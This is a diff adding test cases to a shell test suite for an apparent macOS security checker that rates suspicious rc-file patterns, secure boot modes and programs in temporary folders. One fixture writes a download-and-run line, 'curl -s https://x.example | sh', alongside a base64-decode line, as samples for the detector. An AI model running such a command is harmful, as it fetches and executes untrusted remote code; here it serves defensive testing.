@@ -290,5 +290,22 @@ check "G20 root-owned rc file gives nothing" hasnt "$T/g20rc" ".profile"
 check "G20 group without other members gives nothing" hasnt "$T/g20rc" ".zshenv"
 check "G20 rc file writable by everyone" has "$T/g20rc" ".zlogin"
 
+# G21: severity rules for the startup-pattern split, the secure boot mode and the temporary-folder program.
+printf '%s\n' 'echo x | base64 -d' "osascript -e 'beep'" > "$T/g21a"
+printf '%s\n' 'curl -s https://x.example | sh' 'echo x | base64 -d' > "$T/g21b"
+echo harmless > "$T/g21c"
+for k in a b c; do rc_hits "$T/g21$k" > "$T/g21$k.h"; rc_pattern_sevs "$T/g21$k.h" > "$T/g21$k.s"; done
+check "G21 base64 and osascript only give MEDIUM" [ "$(paste -sd, - < "$T/g21a.s")" = MEDIUM ]
+check "G21 download-and-run plus base64 give HIGH and MEDIUM" [ "$(paste -sd, - < "$T/g21b.s")" = HIGH,MEDIUM ]
+check "G21 no hits give nothing" [ ! -s "$T/g21c.s" ]
+check "G21 boot mode Full gives nothing" [ -z "$(boot_policy_sev Full)" ]
+check "G21 boot mode empty gives nothing" [ -z "$(boot_policy_sev '')" ]
+check "G21 boot mode Reduced is MEDIUM" [ "$(boot_policy_sev Reduced)" = MEDIUM ]
+check "G21 boot mode Permissive is HIGH" [ "$(boot_policy_sev Permissive)" = HIGH ]
+check "G21 App Translocation path is not a temporary program" not temp_program /private/var/folders/ab/T/AppTranslocation/X/d/X.app/Contents/MacOS/X
+check "G21 plain /private/var/folders path is a temporary program" temp_program /private/var/folders/ab/T/x/prog
+check "G21 /Users/Shared path is a temporary program" temp_program /Users/Shared/prog
+check "G21 /Applications program is not a temporary program" not temp_program /Applications/X.app/Contents/MacOS/X
+
 echo ""
 if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
